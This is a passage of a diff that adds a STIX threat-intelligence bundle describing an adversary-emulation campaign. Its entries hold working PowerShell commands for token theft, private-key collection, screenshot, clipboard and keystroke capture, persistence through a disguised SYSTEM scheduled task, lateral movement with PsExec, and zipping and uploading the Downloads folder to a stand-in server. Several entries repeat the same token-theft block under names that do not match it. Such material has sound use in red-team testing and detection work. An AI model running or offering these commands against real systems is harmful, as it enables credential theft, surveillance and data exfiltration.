+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3f65925a-7715-4ff1-a134-402f17a8cfd8",
+            "created": "2024-02-03T15:12:49.170079Z",
+            "modified": "2024-02-03T15:12:49.170079Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+            "created": "2024-02-03T15:12:49.170367Z",
+            "modified": "2024-02-03T15:12:49.170367Z",
+            "name": "Query Registry",
+            "description": "A token theft script was executed to steal and assume the token of another user\u2019s existing process, changing the user context of the process.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\StealToken.ps1 -Verbose -Force;\nStealToken;\nCreateProcessWithToken -CommandLine 'cmd.exe /c reg query \"\\\\#{remote.file.share}\\hklm\\system\\currentcontrolset\\control\\terminal server\"';\nCreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \".\\sandcat.exe #{server} evals\" /sc ONLOGON /RU SYSTEM';\nCreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';\nCreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';\nRevertToSelf;\n",
+                                "payloads": [
+                                    "StealToken.ps1",
+                                    "sandcat.go-windows"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--739f7999-4a2f-4157-82c9-73873da8fcf3",
+            "created": "2024-02-03T15:12:49.17095Z",
+            "modified": "2024-02-03T15:12:49.17095Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--caf73264-3464-4b27-a775-c29671c64e16",
+            "created": "2024-02-03T15:12:49.171528Z",
+            "modified": "2024-02-03T15:12:49.171528Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--1b9e018d-986d-42d9-bb8b-0e104e98ce9c",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--03002d55-d44a-4f27-a2b8-bb0546a0d82a",
+            "created": "2024-02-03T15:12:49.171838Z",
+            "modified": "2024-02-03T15:12:49.171838Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--1b9e018d-986d-42d9-bb8b-0e104e98ce9c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--c4f4b13c-87b6-498c-b814-93570173068c",
+            "created": "2024-02-03T15:12:49.17215Z",
+            "modified": "2024-02-03T15:12:49.17215Z",
+            "name": "Credentials In Files (T1081) - Private Keys Extraction",
+            "description": "Obtain credentials via Custom PowerShell",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1552.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-PfxCertificate -Exportable -FilePath \".\\dmevals.local.pfx\" -CertStoreLocation Cert:\\LocalMachine\\My;\n\nif (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\";\n. .\\readme.ps1;\nGet-PrivateKeys;\nif ($? -eq $True) {\n    write-host \"[+] Successfully executed private key collection script.\";\n    exit 0;\n} else {\n    write-host \"[!] Error, could not execution Get-PrivateKeys.\";\n    exit 1;\n}\n",
+                                "payloads": [
+                                    "dmevals.local.pfx"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Unsecured Credentials: Private Keys"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--22eb234e-1ab6-42ec-ab9f-bd25d8bd936b",
+            "created": "2024-02-03T15:12:49.172472Z",
+            "modified": "2024-02-03T15:12:49.172472Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--c4f4b13c-87b6-498c-b814-93570173068c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a4b14c10-49aa-4ae4-b165-d5a37364fe62",
+            "created": "2024-02-03T15:12:49.172983Z",
+            "modified": "2024-02-03T15:12:49.172983Z",
+            "name": "Staging files for PowerShell module imports",
+            "description": "Renaming psversion.txt to psversion.txt to be imported",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1036.005",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysInternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysInternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\n\nSet-Location -path \"C:\\Program Files\\SysInternalsSuite\";\nif (test-path -path \".\\psversion.txt\" ) {\n  move-item .\\psversion.txt psversion.ps1 -Force;\n}\n  write-host \"[+] File psversion.ps1 staged to be imported.\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Masquerading: Match Legitimate Name or Location"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e9d9853a-056a-42e8-9c33-b4cdcce309da",
+            "created": "2024-02-03T15:12:49.17331Z",
+            "modified": "2024-02-03T15:12:49.17331Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a4b14c10-49aa-4ae4-b165-d5a37364fe62"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a81ea4ad-bc9f-49a7-82d4-4466df641487",
+            "created": "2024-02-03T15:12:49.173615Z",
+            "modified": "2024-02-03T15:12:49.173615Z",
+            "name": "Screen Capturing",
+            "description": "Load custom PowerShell module and take screenshots.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1113",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\\psversion.ps1\";)) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite\\psversion.ps1 does not exist. Execution has stopped.\";\n  exit 1;\n}\n\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\";\n. .\\psversion.ps1;\nInvoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName \"Screenshot\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Screen Capture"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d63a84df-6540-49aa-a991-01d8a181128e",
+            "created": "2024-02-03T15:12:49.174012Z",
+            "modified": "2024-02-03T15:12:49.174012Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a81ea4ad-bc9f-49a7-82d4-4466df641487"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--ee4c2eab-be57-434c-a32c-14b77360301a",
+            "created": "2024-02-03T15:12:49.174322Z",
+            "modified": "2024-02-03T15:12:49.174322Z",
+            "name": "Automated Collection (T1119) - Clipboard (T1115)",
+            "description": "Get contents of clipboard",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1115",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "$clip_data=get-clipboard;\nif ($clip_data.Length -gt 0) {\n  write-host \"[+] Clipboard data obtained!\\n\";\n  write-host $clip_data;\n} else {\n  write-host \"[!] No clipboard data available!\\n\";\n}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Clipboard Data"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5dfcdc4a-8fab-4197-b30a-bf041e97a4ce",
+            "created": "2024-02-03T15:12:49.174596Z",
+            "modified": "2024-02-03T15:12:49.174596Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--ee4c2eab-be57-434c-a32c-14b77360301a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--db28f68d-e8b8-46e6-b680-642570d4b257",
+            "created": "2024-02-03T15:12:49.174934Z",
+            "modified": "2024-02-03T15:12:49.174934Z",
+            "name": "Automated Collection (T1119) - Input Capture (T1417)",
+            "description": "Load custom PowerShell module, and grab keystrokes for 15 seconds.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1056.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\";\n. .\\psversion.ps1;\nGet-Keystrokes;\nStart-Sleep -Seconds 15;\nView-Job -JobName \"Keystrokes\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Input Capture: Keylogging"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e42833f1-e3a2-4440-8e7b-a0b0dfe3d434",
+            "created": "2024-02-03T15:12:49.175276Z",
+            "modified": "2024-02-03T15:12:49.175276Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--db28f68d-e8b8-46e6-b680-642570d4b257"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--a612311d-a802-48da-bb7f-88a4b9dd7a24",
+            "created": "2024-02-03T15:12:49.175602Z",
+            "modified": "2024-02-03T15:12:49.175602Z",
+            "name": "Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)",
+            "description": "Compress all data within Download directory and exfiltrate the results.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1041",
+                    "input_arguments": {
+                        "profile_user": {
+                            "default": "Administrator",
+                            "description": "Name of profile user",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Write-Host \"[*] Compressing all the things in download dir\";\nCompress-Archive -Path \"C:\\Users\\#{profile_user}\\Downloads\\*.*\" -DestinationPath \"$env:APPDATA\\OfficeSupplies.zip\";\n\nImport-Module .\\upload.ps1 -Verbose -Force;\nInvoke-MultipartFormDataUpload -InFile \"$env:APPDATA\\OfficeSupplies.zip\" -Uri \"#{server}/file/upload\";\nif ($?) {\n  write-host \"[+] Data exfil of download directory completed!\";\n} else {\n  write-host \"[!] Data exfil failed!\";\n}\n",
+                                "payloads": [
+                                    "upload.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Exfiltration Over C2 Channel"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c688735e-695e-4243-897b-ea872685e248",
+            "created": "2024-02-03T15:12:49.176926Z",
+            "modified": "2024-02-03T15:12:49.176926Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--a612311d-a802-48da-bb7f-88a4b9dd7a24",
+            "target_ref": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--e9dbdf7c-3f27-52df-805a-90834ad4853f",
+            "account_login": "Administrator"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d61506c4-156b-4d88-a9d7-60d1754a6087",
+            "created": "2024-02-03T15:12:49.177975Z",
+            "modified": "2024-02-03T15:12:49.177975Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--a612311d-a802-48da-bb7f-88a4b9dd7a24",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6de5db2d-9ae0-4f83-bf33-3a62126fb4f4",
+            "created": "2024-02-03T15:12:49.178377Z",
+            "modified": "2024-02-03T15:12:49.178377Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--a612311d-a802-48da-bb7f-88a4b9dd7a24"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9b518cfb-125f-466e-872b-4f8171773ce5",
+            "created": "2024-02-03T15:12:49.178635Z",
+            "modified": "2024-02-03T15:12:49.178635Z",
+            "name": "Remote File Copy (T1105)",
+            "description": "A token theft script was executed to steal and assume the token of another user\u2019s existing process, changing the user context of the process.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134.001",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\StealToken.ps1 -Verbose -Force;\nStealToken;\nCreateProcessWithToken -CommandLine 'cmd.exe /c reg query \"\\\\#{remote.file.share}\\hklm\\system\\currentcontrolset\\control\\terminal server\"';\nCreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \".\\sandcat.exe #{server} evals\" /sc ONLOGON /RU SYSTEM';\nCreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';\nCreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';\nRevertToSelf;\n",
+                                "payloads": [
+                                    "StealToken.ps1",
+                                    "sandcat.go-windows"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation: Token Impersonation/Theft"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e92858d3-9957-4434-90e3-c52967f67c00",
+            "created": "2024-02-03T15:12:49.17956Z",
+            "modified": "2024-02-03T15:12:49.17956Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9b518cfb-125f-466e-872b-4f8171773ce5",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f1721355-7aca-48e9-8a25-0f70f10bd6f2",
+            "created": "2024-02-03T15:12:49.181206Z",
+            "modified": "2024-02-03T15:12:49.181206Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9b518cfb-125f-466e-872b-4f8171773ce5",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--409eade3-cefb-4f4e-951a-5b117af490e8",
+            "created": "2024-02-03T15:12:49.181789Z",
+            "modified": "2024-02-03T15:12:49.181789Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--9b518cfb-125f-466e-872b-4f8171773ce5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+            "created": "2024-02-03T15:12:49.182106Z",
+            "modified": "2024-02-03T15:12:49.182106Z",
+            "name": "Scheduled Tasks (T1053)",
+            "description": "A token theft script was executed to steal and assume the token of another user\u2019s existing process, changing the user context of the process.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134.001",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\StealToken.ps1 -Verbose -Force;\nStealToken;\nCreateProcessWithToken -CommandLine 'cmd.exe /c reg query \"\\\\#{remote.file.share}\\hklm\\system\\currentcontrolset\\control\\terminal server\"';\nCreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \".\\sandcat.exe #{server} evals\" /sc ONLOGON /RU SYSTEM';\nCreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';\nCreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';\nRevertToSelf;\n",
+                                "payloads": [
+                                    "StealToken.ps1",
+                                    "sandcat.go-windows"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation: Token Impersonation/Theft"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2f393161-49c9-4745-a64b-1241b29113bb",
+            "created": "2024-02-03T15:12:49.182885Z",
+            "modified": "2024-02-03T15:12:49.182885Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5c714002-f7ca-4f89-81f2-d1d2abfc9b7f",
+            "created": "2024-02-03T15:12:49.183605Z",
+            "modified": "2024-02-03T15:12:49.183605Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--6b90da47-13d0-48fc-8f07-0a1e6d5d876e",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--956fcef8-8c7c-4276-a41c-1c96c005ed4b",
+            "created": "2024-02-03T15:12:49.184459Z",
+            "modified": "2024-02-03T15:12:49.184459Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--6b90da47-13d0-48fc-8f07-0a1e6d5d876e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--95564347-e77a-4a89-b08f-dcafa5468f2c",
+            "created": "2024-02-03T15:12:49.184808Z",
+            "modified": "2024-02-03T15:12:49.184808Z",
+            "name": "Remote System Discovery (T1018)",
+            "description": "Custom PowerShell script to perform AD triage for domain bound computers.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1059.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\")) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\";\n  exit 1;\n}\n\nSet-Location -path \"C:\\Program Files\\SysinternalsSuite\";\n. .\\psversion.ps1;\nAd-Search Computer Name *;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Command and Scripting Interpreter: PowerShell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1e66d32d-f4bf-4ee4-bac6-c1c900e7fb30",
+            "created": "2024-02-03T15:12:49.185133Z",
+            "modified": "2024-02-03T15:12:49.185133Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--95564347-e77a-4a89-b08f-dcafa5468f2c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--c4a59e39-53b0-4ace-9528-8ff052752ece",
+            "created": "2024-02-03T15:12:49.185399Z",
+            "modified": "2024-02-03T15:12:49.185399Z",
+            "name": "Identifying current user on other machines",
+            "description": "Custom PowerShell script to perform AD triage for domain bound computers.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1059.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Invoke-Command -ComputerName \"$(hostname)\" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Command and Scripting Interpreter: PowerShell"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4b38670b-8892-4bb7-a2a0-c6997fafabce",
+            "created": "2024-02-03T15:12:49.18561Z",
+            "modified": "2024-02-03T15:12:49.18561Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--c4a59e39-53b0-4ace-9528-8ff052752ece"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+            "created": "2024-02-03T15:12:49.186048Z",
+            "modified": "2024-02-03T15:12:49.186048Z",
+            "name": "File and Directory Discovery (T1083)",
+            "description": "A token theft script was executed to steal and assume the token of another user\u2019s existing process, changing the user context of the process.",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1134.001",
+                    "input_arguments": {
+                        "remote.file.share": {
+                            "default": "192.0.2.20",
+                            "description": "IP or Hostname of remote file share",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Import-Module .\\StealToken.ps1 -Verbose -Force;\nStealToken;\nCreateProcessWithToken -CommandLine 'cmd.exe /c reg query \"\\\\#{remote.file.share}\\hklm\\system\\currentcontrolset\\control\\terminal server\"';\nCreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn \"Resume Viewer Update Checker\" /tr \".\\sandcat.exe #{server} evals\" /sc ONLOGON /RU SYSTEM';\nCreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';\nCreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';\nRevertToSelf;\n",
+                                "payloads": [
+                                    "StealToken.ps1",
+                                    "sandcat.go-windows"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Access Token Manipulation: Token Impersonation/Theft"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f1585a97-2186-42b8-ab67-e770bceaee15",
+            "created": "2024-02-03T15:12:49.187165Z",
+            "modified": "2024-02-03T15:12:49.187165Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+            "target_ref": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--7b20f141-4a12-50b6-a9ce-a0621eff28f0",
+            "value": "192.0.2.20"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8f7cfa1d-6805-485f-b3cd-4918b2d84655",
+            "created": "2024-02-03T15:12:49.187674Z",
+            "modified": "2024-02-03T15:12:49.187674Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--9fefcde6-083a-4440-8eca-dc03d30c0bcb",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a5fbae79-c26e-4515-9712-9bbe59495bc2",
+            "created": "2024-02-03T15:12:49.187878Z",
+            "modified": "2024-02-03T15:12:49.187878Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--4975696e-1d41-11eb-adc1-0242ac120002",
+            "target_ref": "attack-pattern--9fefcde6-083a-4440-8eca-dc03d30c0bcb"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+            "created": "2024-02-03T15:12:49.188066Z",
+            "modified": "2024-02-03T15:12:49.188066Z",
+            "name": "Copy Sandcat File",
+            "description": "Copy Sandcat file using PsExec",
+            "extensions": {
+                "extension-definition--d3d97005-4603-4124-ab64-dae67c97e005": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "pivot_machine_hostname": {
+                            "default": "pivothost",
+                            "description": "Hostname of pivot machine",
+                            "type": "string"
+                        },
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        },
+                        "user.session.id": {
+                            "default": "1",
+                            "description": "Session id for user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "move-item sandcat.go-windows-upx C:\\Windows\\temp\\python.exe -force;\nset-location \"C:\\Program Files\\SysinternalsSuite\\\";\n.\\PsExec64.exe -accepteula \\\\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c \"C:\\Windows\\Temp\\python.exe\" -group \"day-1-lateral-movement\" -server \"#{server}\";\ntasklist /S #{pivot_machine_hostname} /FI \"IMAGENAME eq python.exe\";\n",
+                                "payloads": [
+                                    "sandcat.go-windows-upx"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--75980b4e-f943-4e4c-9c97-d5dc74f720ee",
+            "created": "2024-02-03T15:12:49.188527Z",
+            "modified": "2024-02-03T15:12:49.188527Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--bddc0abc-07a0-41b7-813f-e0c64d9226b3",
+            "target_ref": "user-account--9ebe720f-8ed1-5809-84c7-e43b0964f25b"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--9ebe720f-8ed1-5809-84c7-e43b0964f25b",
+            "account_login": "pivothost"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--81b89a20-cf35-405d-b02c-969232d37671",
